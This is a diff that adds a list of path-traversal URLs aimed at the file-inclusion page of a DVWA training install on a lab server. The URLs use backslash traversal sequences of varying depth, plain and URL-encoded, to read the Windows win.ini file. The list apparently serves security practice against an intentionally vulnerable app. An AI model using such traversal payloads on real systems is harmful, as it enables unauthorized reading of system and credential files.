@@ -1,0 +1,14 @@
+
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=\..\WINDOWS\win.ini
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=\..\..\WINDOWS\win.ini
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=\..\..\..\WINDOWS\win.ini
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=\..\..\..\..\WINDOWS\win.ini
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=\..\..\..\..\..\WINDOWS\win.ini
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=\..\..\..\..\..\..\WINDOWS\win.ini
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
+http://49.234.20.216/lab/WWW/CTF_test/DVWA-master/DVWA-master/vulnerabilities/fi/?page=%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69
